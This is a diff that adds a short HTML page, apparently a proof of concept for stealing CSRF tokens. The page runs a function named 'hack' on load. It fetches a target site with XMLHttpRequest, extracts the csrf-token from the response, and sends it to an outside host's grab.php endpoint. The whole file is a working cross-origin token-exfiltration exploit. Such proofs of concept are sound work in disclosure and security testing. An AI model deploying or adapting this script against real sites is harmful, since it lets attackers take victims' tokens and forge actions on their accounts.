@@ -1,0 +1,32 @@
+<html>
+<head>
+   <script>
+      function hack()
+      {
+         var xmlhttp;
+         if (window.XMLHttpRequest)
+           {
+           xmlhttp=new XMLHttpRequest();
+           }
+         else
+           {
+           xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+           }
+         xmlhttp.open("GET","https://site.com/",false);
+         xmlhttp.send();
+         if(xmlhttp.status==200)
+         {
+            var str=xmlhttp.responseText;
+            var n=str.search("csrf-token");
+            var c=str.substring(n+30,n+74);
+            var url = "https://yassineaboukir.com/grab.php?c=" + encodeURIComponent(c);
+            xmlhttp.open("GET", url, true);
+            xmlhttp.send();
+         }
+      }
+   </script>
+</head>
+<body onload="hack();">
+</body>
+</html>
+
